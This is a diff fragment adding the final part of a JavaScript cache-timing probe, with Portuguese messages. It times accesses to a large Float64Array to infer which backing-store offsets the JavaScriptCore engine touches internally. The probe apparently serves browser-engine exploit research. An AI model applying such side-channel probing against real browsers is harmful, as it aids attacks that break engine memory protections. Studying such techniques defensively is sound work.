+  info('Diferença: ' + (maxTime - minTime).toFixed(4) + 'ms');
+
+  var ratio = maxTime / (minTime || 0.0001);
+  info('Ratio max/min: ' + ratio.toFixed(2) + 'x');
+
+  if(ratio > 2.0) {
+    alerta('TIMING DIFERENCIAL SIGNIFICATIVO!\n' +
+           'bigF64[' + minPos + '] é ' + ratio.toFixed(1) + 'x mais rápido que bigF64[' + maxPos + ']\n' +
+           'Isso sugere que bigF64[' + minPos + '] está em cache de CPU\n' +
+           '= o motor acessou essa posição internamente!\n' +
+           'O byte offset ' + (minPos * 8) + ' no backing store do bigF64\n' +
+           'corresponde a uma estrutura interna do JSC acessada pelo motor.');
+  } else {
+    info('Sem diferencial significativo (ratio=' + ratio.toFixed(2) + 'x).');
+    info('Timer pode não ter resolução suficiente, ou o motor não acessou posições específicas.');
+  }
+
+  sep();
+  // Mostrar distribuição dos tempos
+  info('\nDistribuição de tempos (primeiras 20 posições):');
+  for(var i=0;i<Math.min(20, POSITIONS_TO_TEST);i++) {
+    var bar = '█'.repeat(Math.round(timings[i] / minTime));
+    info('bigF64[' + i.toString().padStart(3) + ']: ' + timings[i].toFixed(4) + 'ms ' + bar);
+  }
+}
+</script>
 </body>
 </html>
+
